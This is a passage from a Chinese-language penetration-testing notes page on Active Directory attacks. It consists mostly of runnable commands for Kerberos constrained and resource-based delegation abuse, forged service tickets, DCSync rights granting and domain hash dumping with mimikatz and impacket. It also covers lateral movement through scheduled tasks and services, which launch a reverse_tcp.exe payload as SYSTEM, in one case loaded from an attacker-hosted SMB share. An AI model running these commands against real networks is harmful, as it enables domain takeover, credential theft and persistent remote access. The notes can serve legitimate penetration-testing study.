+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021705451.webp" alt="image-20240402170549288" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021705451.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021705451.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404021705451.webp?size=large 2x" data-title="image-20240402170549288" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>####### 攻击</p>
+<ul>
+<li>利用1</li>
+</ul>
+<pre tabindex="0"><code>当知道justtest这个服务用户的明文密码或者Hash时，可以用kekeo请求它的TGT:
+
+拥有明文密码
+tgt::ask /user:justtest /domain:yokan.com /password:**********
+
+拥有账户的Hash
+tgt::ask /user:justtest /domain:yokan.com /NTLM:xxxxxxxxxxxxxxx
+
+PS:如果既不知道明文也不知道Hash，如果有了服务用户登录的主机权限，可以用mimikatz从内存中把服务用户的TGT dump下来照样可以实现
+从内存中导出所有票据
+privilege::debug
+sekurlsa::tickets /export
+
+然后通过justtest的TGT伪造s4u请求以administrator身份请求访问域控(WIN-1D09BAA27UF) cifs的ST ：
+*tgs::s4u /tgt:TGT_justtest@YOKAN.COM_krbtgt~yokan.com@YOKAN.COM.kirbi /user:Administrator@yokan.com /service:cifs/WIN-1D09BAA27UF.yokan.com*
+（S4U2Self获取到的ST1以及S4U2Proxy获取到的域控CIFS服务的ST2会保存在当前目录下，然后我们用mimikatz将ST2导入当前会话即可）
+
+用mimikatz将票据导入内存中
+*kerberos::ptt TGS_Administrator@yokan.com@YOKAN.COM_cifs~WIN-1D09BAA27UF.yokan.com@YOKAN.COM.kirbi*</code></pre><ul>
+<li>利用约束委派生成黄金票据</li>
+</ul>
+<pre tabindex="0"><code>TGT的生成是由krbtgt用户加密和签名的，如果我们能委派krbtgt服务，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用krbtgt的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。
+
+我们可以用impacket套件攻击（可以py脚本，也可以exe,这里用py）
+
+使用getST向KDC请求administrator的TGT:
+*python getst.py -dc-ip 192.168.111.134 -spn krbtgt/yokan.com -impersonate Administrator yokan.com/justtest:password*
+参数：
+-impersonate：表示伪造用户
+-spn：表示我们要委派的服务的spn，这里是TGS
+-dc-ip：域控ip
+执行之后会在当前目录生成一个缓存文件Administrator.ccache
+
+
+
+黄金票据利用：
+（1）获取域控权限
+用mimikatz进行ptc（pass the cache），将缓存注入当前会话中
+kerbores::ptc C:\path\test.ccache
+cmd下，klist查看缓存的票据
+klist
+
+（2）用wmiexec弹出一个权限为administrator交互式的shell
+set KRB5CCNAME=administrator.ccache
+python wmiexec.py -no-pass -k administrator@WIN-1D09BAA27UF.yokan.com -dc-ip 192.168.111.134
+
+（3）导出域内哈希
+set KRB5CCNAME=administrator.ccache
+python secretsdump.py -no-pass -k WIN-1D09BAA27UF.yokan.com</code></pre><h6 id="基于资源的约束委派" class="heading-element"><span>0.0.0.7.3  基于资源的约束委派</span>
+  <a href="#%e5%9f%ba%e4%ba%8e%e8%b5%84%e6%ba%90%e7%9a%84%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><a href="https://exp10it.io/2023/08/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-rbcd-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"target="_blank" rel="external nofollow noopener noreferrer">https://exp10it.io/2023/08/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-rbcd-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></p>
+<blockquote>
+<p>传统的约束委派是正向的, 需要以域管的权限将 Service A 的 <code>msDS-AllowedToDelegateTo</code> 属性指定为 Service B</p>
+<p>而基于资源的约束委派则是反向的, 无需域管权限, 只需要在 Service B 上将 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性指定为 Service A, 即可完成委派的配置</p>
+</blockquote>
+<p>和约束委派比较像，感觉用的比较多，约束委派大多数只有域管才有权限设置，基于资源的约束委派只需要有这仨之一的权限：</p>
+<ul>
+<li>GenericALL</li>
+<li>WriteProperty</li>
+<li>WriteDacl</li>
+</ul>
+<p>利用姿势是：</p>
+<ul>
+<li>利用域用户创建机器账户（因为只有服务账户和机器账户才有委派权限）</li>
+<li>利用域用户向某个机器写入 基于资源的约束委派 ，委派新创建的机器账户可以委派前面说的“某个机器”</li>
+</ul>
+<p>如下</p>
+<pre tabindex="0"><code>首先利用 Alice 账户在域内添加一个机器账户
+addcomputer.py hack-my.com/Alice:&#39;Alice123!&#39; -computer-name TEST\$ -computer-pass 123456 -dc-host DC.hack-my.com -dc-ip 192.168.30.10 
+
+然后配置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性
+rbcd.py hack-my.com/Alice:&#39;Alice123!&#39; -dc-ip 192.168.30.10  -action write -delegate-to WIN2008-WEB\$ -delegate-from TEST\$</code></pre><p>可以看到已经成功配置了 RBCD</p>
+<p>最后利用 S4U 协议伪造 Administrator 用户申请 ST</p>
+<pre tabindex="0"><code>getST.py -dc-ip 192.168.30.10 -spn cifs/WIN2008-WEB.hack-my.com -impersonate Administrator hack-my.com/test\$:123456
+
+export KRB5CCNAME=Administrator.ccache
+psexec.py -no-pass -k WIN2008-WEB.hack-my.com -dc-ip 192.168.30.10</code></pre><p>流程</p>
+<pre tabindex="0"><code>生成机器账户
+01.proxychains impacket-addcomputer -method SAMR xiaorang.lab/lixiuying:winniethepooh -computer-name 02\$ -computer-pass Passw0rd -dc-ip 172.22.15.13
+02.SharpAllowedToAct.exe -m ljc886 -p qwer1234! -t XR-0687 -a XR-DC01.xiaorang.lab -d xiaorang.lab
+
+修改属性
+proxychains impacket-rbcd xiaorang.lab/lixiuying:&#39;winniethepooh&#39; -dc-ip 172.22.15.13 -action write -delegate-to &#39;XR-0687$&#39; -delegate-from &#39;02$&#39;
+
+生成票据
+proxychains impacket-getST xiaorang.lab/&#39;02$&#39;:&#39;Passw0rd&#39; -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13
+
+导入票据
+export KRB5CCNAME=Administrator.ccache
+
+无密码连接
+proxychains impacket-psexec administrator@XR-0687.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13
+proxychains impacket-wmiexec XR-0687.xiaorang.lab -no-pass -k -dc-ip 172.22.15.13</code></pre><h5 id="dcsync" class="heading-element"><span>0.0.0.8  DCSync</span>
+  <a href="#dcsync" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><a href="https://tttang.com/archive/1634/"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1634/</a></p>
+<blockquote>
+<p>在DCSync技术没有出现之前，攻击者要想拿到域内用户的hash，就只能在域控制器上运行 Mimikatz 或 Invoke-Mimikatz去抓取密码hash，但是在2015 年 8 月份， Mimkatz新增了一个主要功能叫&quot;DCSync&quot;，使用这项技术可以有效地 &ldquo;模拟&rdquo; 域控制器并从目标域控上请求域内用户密码hash。这项技术为当下域渗透提供了极大地便利，可以直接远程dump域内hash，另外也衍生出很多的攻击方式</p>
+<p>刚刚我们说可以去模拟域控然后从目标域控上请求hash，那么这里就涉及到一个知识点叫==AD的复制技术==：</p>
+<p>域控制器(DC)是Active Directory(AD)域的支柱，用于高效的管理域内用户，所以在企业当中，为了防止DC出现意外导致域内瘫痪，所以都是要布置多台域控作为AD域的备份，或者是部署多台域控制器，方便在站点位置本地提供身份验证和其他策略。当企业内网当做部署了多台域控制器后，一台域控进行了数据的更改之后，需要与其他域控进行数据的同步，而这个同步是通过Microsoft的远程目录复制服务协议 (MS-DRSR),该协议是基于MSRPC / DCE/RPC )进行的。并且其 DRS 的 Microsoft API 是DRSUAPI(这个在后面抓包可以看到)。在不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。==DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求==。</p>
+</blockquote>
+<p>只要域用户拥有以下三条DACL即可向域控发出数据同步请求，从而dump去域内用户hash，这三条DACL分别为：</p>
+<pre tabindex="0"><code>复制目录更改（DS-Replication-Get-Changes）
+全部复制目录更改 (DS-Replication-Get-Changes-All )
+在过滤集中复制目录更改(可有可无)（DS-Replication-Get-Changes-In-Filtered-Set）</code></pre><p>默认情况下，若拿到用户为以下组的用户，即可直接写入DCSync功能，从而dump哈希</p>
+<pre tabindex="0"><code>Administrators组内的用户
+domain admins组
+enterprise admins组
+域控制器的计算机帐户</code></pre><h6 id="查找域内具有dcsync权限的用户" class="heading-element"><span>0.0.0.8.1  查找域内具有DCSync权限的用户</span>
+  <a href="#%e6%9f%a5%e6%89%be%e5%9f%9f%e5%86%85%e5%85%b7%e6%9c%89dcsync%e6%9d%83%e9%99%90%e7%9a%84%e7%94%a8%e6%88%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>刚刚讲DCSync是向域用户写入两条ACL(授予域用户复制目录更改（DS-Replication-Get-Changes）和全部复制目录更改 (DS-Replication-Get-Changes-All))，我们可以使用powerview中的Add-DomainObjectAcl函数写入DCSync权限</p>
+<p>####### 查询具有DCSync权限的用户</p>
+<p>查询域内具有DCSync权限，其实就是查询域内用户的ACL，对比查询哪个用户拥有复制目录更改（DS-Replication-Get-Changes）和全部复制目录更改 (DS-Replication-Get-Changes-All）两条ACL</p>
+<pre tabindex="0"><code>Import-Module  .\Powerview.ps1
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType  -match &#34;DS-Replication-Get-Changes&#34;}
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType  -match &#34;Replicating Directory Changes&#34;} </code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151036735.webp" alt="image-20240315103638526" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151036735.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151036735.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151036735.webp?size=large 2x" data-title="image-20240315103638526" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>adfind查找</p>
+<pre tabindex="0"><code>AdFind.exe -s subtree -b &#34;DC=test,DC=com&#34; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&#34;Replicating Directory Changes&#34;;; -recmute
+
+AdFind.exe -s subtree -b &#34;DC=test,DC=com&#34; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&#34;Replicating Directory Changes All&#34;;; -recmute</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151036310.webp" alt="image-20240315103656095" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151036310.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151036310.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151036310.webp?size=large 2x" data-title="image-20240315103656095" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>####### 写入DCSync</p>
+<pre tabindex="0"><code>Set-ExecutionPolicy Bypass -Scope Process
+import-module .\PowerView.ps1
+Add-DomainObjectAcl -TargetIdentity &#34;DC=test,DC=com&#34; -PrincipalIdentity haha -Rights DCSync -Verbose</code></pre><p>当然我们更多时候是拿到一个cmd的shell，这么通过cmd调用powerview执行命令</p>
+<pre tabindex="0"><code>powershell.exe -exec bypass -command &#34;&amp;{Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \&#34;DC=test,DC=com\&#34; -PrincipalIdentity haha -Rights DCSync -Verbose}&#34;</code></pre><p>####### 删除DCSync</p>
+<p>cmd下删除：</p>
+<pre tabindex="0"><code>powershell.exe -exec bypass -command &#34;&amp;{Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \&#34;DC=test,DC=com\&#34; -PrincipalIdentity test -Rights DCSync -Verbose}&#34;</code></pre><p>powershell下删除：</p>
+<pre tabindex="0"><code>Import-Module .\PowerView.ps1;
+Remove-DomainObjectAcl -TargetIdentity &#34;DC=test,DC=com&#34; -PrincipalIdentity test -Rights DCSync -Verbose</code></pre><h6 id="dcsync攻击域控" class="heading-element"><span>0.0.0.8.2  DCSync攻击域控</span>
+  <a href="#dcsync%e6%94%bb%e5%87%bb%e5%9f%9f%e6%8e%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>如果拿到了域内用户的权限，则可以在域内直接使用mimikatz去dump域控hash,注意：这里不需要使用debug权限也可以去直接dump哈希的，因为DCSync去向域控发起请求，并非本地操作，为网络请求。</p>
+<p>具有DCSync权限，则可以直接连接域控dump哈希</p>
+<pre tabindex="0"><code>mimikatz.exe &#34;log Micropoor.txt&#34;  &#34;lsadump::dcsync /domain:test.com /all /csv &#34; &#34;exit&#34;</code></pre><p>如果主机上有杀软无法上传mimikatz，可以使用impacket中的secretsdump去dump哈希</p>
+<pre tabindex="0"><code>python3 secretsdump.py test/admin:www123456#@192.168.189.128  -dc-ip  192.168.189.128
+python3 secretsdump.py &#39;test.com/admin@dc.test.com&#39; -hashes :6dfad00b946adf3479fba71beeb5e4ac</code></pre><p>####### 1、DCSync攻击场景一</p>
+<p>若拿到用户为以下组的用户，即可直接写入DCSync功能，从而dump哈希</p>
+<pre tabindex="0"><code>Administrators组内的用户
+domain admins组
+enterprise admins组
+域控制器的计算机帐户</code></pre><p>查看用户admin的ACL，我们都知道域用户在域内是否有权限，具体是看用户所具备的ACL</p>
+<pre tabindex="0"><code>Import-Module .\Powerview.ps1
+Get-DomainObjectAcl -Identity admin -domain test.com -ResolveGUIDs</code></pre><p>####### 2、DCSync攻击场景二</p>
+<p>若当前用户具有WriteDACL权限，那么我们可以通过该权限去写入DCSync功能
+我们先在域控上给用户haha添加WriteDACL的权限</p>
+<pre tabindex="0"><code>Import-Module .\PowerView.ps1
+Add-DomainObjectAcl -TargetIdentity &#34;DC=test,DC=com&#34; -PrincipalIdentity haha -Rights WriteDacl -Verbose</code></pre><p>查看用户haha的DACL，发现其拥有WriteDACL的权限</p>
+<pre tabindex="0"><code> Get-ObjectAcl -SamAccountName &#34;haha&#34; -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights-like &#34;*dacl*&#34;}</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151042307.webp" alt="image-20240315104249108" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151042307.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151042307.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202403151042307.webp?size=large 2x" data-title="image-20240315104249108" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>那么便可以向自己写入DCSync权限</p>
+<pre tabindex="0"><code>powershell.exe -exec bypass -command &#34;&amp;{Import-Module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \&#34;DC=test,DC=com\&#34; -PrincipalIdentity haha -Rights DCSync -Verbose}&#34;</code></pre><p>从而直接mimikatz去dump哈希</p>
+<h5 id="计划任务" class="heading-element"><span>0.0.0.9  计划任务</span>
+  <a href="#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="ipc" class="heading-element"><span>0.0.0.9.1  ipc</span>
+  <a href="#ipc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>可以通过已有的ipc连接创建计划任务</p>
+<p>操作步骤：</p>
+<ol>
+<li>利用已建立的IPC连接上传后门程序</li>
+<li>利用已建立的IPC连接或指定用户凭据的方式在远程主机上创建计划任务shell</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>schtasks /Create /S 192.168.1.131 /TN Backdoor /SC minute /MO <span style="color:#a6be9d">1</span> /TR C:<span style="color:#a6be9d">\u</span>sers<span style="color:#a6be9d">\p</span>ubilc<span style="color:#a6be9d">\r</span>everse_tcp.exe /RN System /F <span style="color:#828b96;font-style:italic"># /S 指定要连接的系统； /TN 指定计划任务的名称 # /SC 指定计划任务执行频率；  /MO 指定计划任务执行周期 # /TR 指定计划任务执行程序；  /RU 指定计划任务运行的用户权限 # /F  如果指定的任务已存在，则强制创建</span></span></span></code></pre></div><p>如果没有建立IPC连接，则需要指定远程主机的用户凭据</p>
+<pre tabindex="0"><code>schtasks /Create /S 192.168.1.131 /TN Backdoor /SC minute /MO 1 /TR C:\users\pubilc\reverse_tcp.exe /RN System /F /U Administrator /P 123qwe@</code></pre><ul>
+<li>创建完成后，可以等待计划任务自行执行，也可以立即启动计划任务shell</li>
+</ul>
+<pre tabindex="0"><code>schtasks /RUN /S 192.168.1.131 /I /TN Backdoor</code></pre><ul>
+<li>查看计划任务shell</li>
+</ul>
+<pre tabindex="0"><code>schtasks /query /S 192.168.1.131 /TN Backdoor</code></pre><ul>
+<li>删除计划任务shell</li>
+</ul>
+<pre tabindex="0"><code>schtasks /Delete /S 192.168.1.131 /TN Backdoor /F</code></pre><p>也可以通过计划任务执行系统命令，将执行结果写入文件，然后使用type命令查看文件</p>
+<pre tabindex="0"><code>schtasks /Create /S 192.168.1.131 /TN Backdoor /SC minute /MO 1 /TR &#34;c:\windows\system32\cmd.exe /c &#39;whoami&#39; &gt; c:\users\public\result.txt&#34; /RN System /F
+
+
+type \\192.168.1.131\C$\users\public\result.txt
+copy C:\Users\Administrator\Desktop\hack.bat \\192.168.1.131\c$\Windows\Temp
+
+schtasks /create /tn hack /tr C:\Windows\Temp\hack.bat /sc ONSTART /s 192.168.1.131 /ru &#34;system&#34; /u administrator /p 123qwe@
+
+schtasks /run /tn hackk /s 192.168.1.131
+
+type \\192.168.1.131\c$\Windows\Temp\result.txt
+
+schtasks /delete /s 192.168.1.131 /u administrator /p 123qwe@ /tn hackk /f</code></pre><p><strong>注意：在使用schtasks命令时，会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt。</strong></p>
+<h6 id="unc路径加载执行" class="heading-element"><span>0.0.0.9.2  UNC路径加载执行</span>
+  <a href="#unc%e8%b7%af%e5%be%84%e5%8a%a0%e8%bd%bd%e6%89%a7%e8%a1%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>Windows系统使用UNC路径来访问网络共享资源，格式为</p>
+<pre tabindex="0"><code>\\servername\sharename\directory\filename # servername 服务器； sharename 网络共享名字</code></pre><p>攻击载荷在远程主机上时，可以直接使用UNC路径代替常规的本地路径，让目标主机直接在测试人员==搭建的Smb共享==中加载攻击载荷并执行。这样可以省去手动上传载荷的步骤。</p>
+<p>例如：</p>
+<pre tabindex="0"><code>schtasks /Create /S 192.168.1.131 /TN Backdoor /SC minute /MO 1 /TR \\192.168.1.1\mysmb\reverse_tcp.exe /RN System /F</code></pre><h5 id="系统服务" class="heading-element"><span>0.0.0.10  系统服务</span>
+  <a href="#%e7%b3%bb%e7%bb%9f%e6%9c%8d%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="创建远程服务" class="heading-element"><span>0.0.0.10.1  创建远程服务</span>
+  <a href="#%e5%88%9b%e5%bb%ba%e8%bf%9c%e7%a8%8b%e6%9c%8d%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>创建远程服务需要拥有**两端主机的管理员权限（要创建服务）**和IPC连接，具体操作：</p>
+<ol>
+<li>利用已建立的共享连接向远程主机上传攻击载荷reverse_tcp.exe</li>
+<li>利用已建立的IPC连接在远程主机上创建系统服务shell</li>
+</ol>
